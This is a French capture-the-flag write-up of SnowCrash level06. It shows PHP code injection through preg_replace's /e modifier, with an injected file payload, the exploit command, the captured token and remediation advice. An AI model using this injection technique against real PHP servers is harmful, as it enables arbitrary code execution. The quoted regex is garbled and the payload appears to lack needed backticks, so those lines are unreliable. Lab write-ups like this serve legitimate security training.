# SnowCrash - level06 writeup

## Objectif

Exploiter une vulnérabilité d’évaluation de code PHP pour exécuter getflag et récupérer le token.

## Recon

Analyse du script PHP :

```
cat level06.php
#!/usr/bin/php

<?php function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; } function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; } $r = x($argv[1], $argv[2]); print $r; ?>

```

Point critique :

```
preg_replace("/(
x(.∗)
x(.∗))/e", "y("\2")", $a);
```

Le modificateur /e indique que le remplacement est évalué comme du code PHP.

## Analyse

Le contenu du fichier passé en argument est injecté dans une expression PHP évaluée dynamiquement.

La séquence (/e) permet une PHP Code Injection.
En injectant une expression contenant une exécution de commande, celle-ci sera évaluée par PHP.

Payload contrôlé :

```
[x ${getflag}]
```

Ce payload est interprété comme du code PHP lors du preg_replace, ce qui exécute getflag.

## Exploitation

Création du fichier malveillant :

```
echo '[x ${getflag}]' > /tmp/a
```

Exécution du binaire :

```
./level06 /tmp/a
```

Sortie observée :

```
Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
```

## Résultat

- Vulnérabilité - > PHP Code Injection via preg_replace avec modificateur /e
- Token getflag - > wiok45aaoguiboiki2tuin6ub

## Notes

- Le modificateur /e est supprimé en PHP 7+ car intrinsèquement dangereux
- Correction : utiliser preg_replace_callback et ne jamais évaluer du code issu d’entrées utilisateur
- Cette vulnérabilité permet une exécution arbitraire de code côté serveur
